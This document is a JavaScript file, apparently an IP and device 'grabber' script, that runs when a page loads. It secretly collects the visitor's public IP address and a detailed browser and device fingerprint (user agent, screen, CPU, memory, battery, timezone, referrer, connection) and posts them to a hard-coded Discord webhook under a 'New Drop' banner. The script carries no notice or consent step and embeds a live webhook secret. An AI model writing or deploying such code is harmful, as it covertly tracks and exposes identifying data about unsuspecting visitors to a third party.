async function fetchIP() {
    const randomId = generateRandomId();
    document.getElementById('random-id').textContent = `Random ID: ${randomId}`;

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ipAddress = data.ip;

        const systemInfo = await getSystemInfo();
        sendToDiscord(ipAddress, randomId, systemInfo);
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }
}

function sendToDiscord(ipAddress, randomId, systemInfo) {
    const webhookUrl = 'https://discord.com/api/webhooks/1217827432644612136/sguTiBo-8wtF_soaNn6zOGgVc_nexPpeEdXz-_bf1WsvzIYfC_I95MK9Pdpm_BOLYi9P';
    const payload = {
        content: `>> New Drop Barosane!!! <<\n===========================================================================\n[+] IP address: ${ipAddress}\n[+] Random ID: ${randomId}${systemInfo}===========================================================================`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log('IP address, random ID, and system info sent to Discord successfully');
        } else {
            console.error('Failed to send IP address, random ID, and system info to Discord');
        }
    })
    .catch(error => {
        console.error('Error sending IP address, random ID, and system info:', error);
    });
}

function generateRandomId() {
    return Math.random().toString(36).substr(2, 8);
}

async function getSystemInfo() {
    const platform = navigator.platform;
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const languages = navigator.languages.join(', ');
    const cookieEnabled = navigator.cookieEnabled;
    const javaEnabled = navigator.javaEnabled();
    const screenResolution = `${screen.width}x${screen.height}`;
    const availableScreenSize = `${screen.availWidth}x${screen.availHeight}`;
    const colorDepth = screen.colorDepth;
    const pixelRatio = window.devicePixelRatio;
    const screenOrientation = screen.orientation ? screen.orientation.type : 'N/A';
    const cpuCores = navigator.hardwareConcurrency;
    const deviceMemory = navigator.deviceMemory || 'N/A';
    const touchSupport = navigator.maxTouchPoints;
    const referrer = document.referrer;
    const currentUrl = window.location.href;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    let connectionInfo = 'N/A';
    if (navigator.connection) {
        const connection = navigator.connection;
        connectionInfo = `${connection.type}\n[+] Effective Type: ${connection.effectiveType}\n[+] Downlink: ${connection.downlink}\n[+] RTT: ${connection.rtt}`;
    }

    let batteryInfo = 'N/A';
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `Charging? ${battery.charging} (Battery Level: ${battery.level * 100}%)`;
        } catch (error) {
            console.error('Error fetching battery info:', error);
        }
    }

    const browserInfo = getBrowserInfo();

    return `
[+] Platform: ${platform}
[+] User Agent: ${userAgent}
[+] Browser: ${browserInfo}
[+] Language: ${language}
[+] Languages: ${languages}
[+] Cookies Enabled: ${cookieEnabled}
[+] Java Enabled: ${javaEnabled}
[+] Screen Resolution: ${screenResolution}
[+] Available Screen Size: ${availableScreenSize}
[+] Color Depth: ${colorDepth}
[+] Pixel Ratio: ${pixelRatio}
[+] Screen Orientation: ${screenOrientation}
[+] CPU Cores: ${cpuCores}
[+] Device Memory: ${deviceMemory} GB
[+] Touch Support: ${touchSupport} points
[+] Referrer: ${referrer}
[+] Current URL: ${currentUrl}
[+] Timezone: ${timezone}
[+] Connection Info: ${connectionInfo}
[+] Battery Info: ${batteryInfo}
`;
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName, fullVersion, majorVersion;
    let verOffset, nameOffset, ix;

    if ((verOffset = ua.indexOf("Opera")) !== -1) {
        browserName = "Opera";
        fullVersion = ua.substring(verOffset + 6);
        if ((verOffset = ua.indexOf("Version")) !== -1) {
            fullVersion = ua.substring(verOffset + 8);
        }
    } else if ((verOffset = ua.indexOf("MSIE")) !== -1) {
        browserName = "Microsoft Internet Explorer";
        fullVersion = ua.substring(verOffset + 5);
    } else if ((verOffset = ua.indexOf("Chrome")) !== -1) {
        browserName = "Chrome";
        fullVersion = ua.substring(verOffset + 7);
    } else if ((verOffset = ua.indexOf("Safari")) !== -1) {
        browserName = "Safari";
        fullVersion = ua.substring(verOffset + 7);
        if ((verOffset = ua.indexOf("Version")) !== -1) {
            fullVersion = ua.substring(verOffset + 8);
        }
    } else if ((verOffset = ua.indexOf("Firefox")) !== -1) {
        browserName = "Firefox";
        fullVersion = ua.substring(verOffset + 8);
    } else if ((nameOffset = ua.lastIndexOf(' ') + 1) < (verOffset = ua.lastIndexOf('/'))) {
        browserName = ua.substring(nameOffset, verOffset);
        fullVersion = ua.substring(verOffset + 1);
        if (browserName.toLowerCase() === browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }

    if ((ix = fullVersion.indexOf(";")) !== -1) {
        fullVersion = fullVersion.substring(0, ix);
    }
    if ((ix = fullVersion.indexOf(" ")) !== -1) {
        fullVersion = fullVersion.substring(0, ix);
    }

    majorVersion = parseInt(fullVersion, 10);
    if (isNaN(majorVersion)) {
        fullVersion = `${parseFloat(navigator.appVersion)}`;
        majorVersion = parseInt(navigator.appVersion, 10);
    }

    return `${browserName} ${fullVersion} (Major Version: ${majorVersion})`;
}

document.addEventListener('DOMContentLoaded', (event) => {
    fetchIP();
});
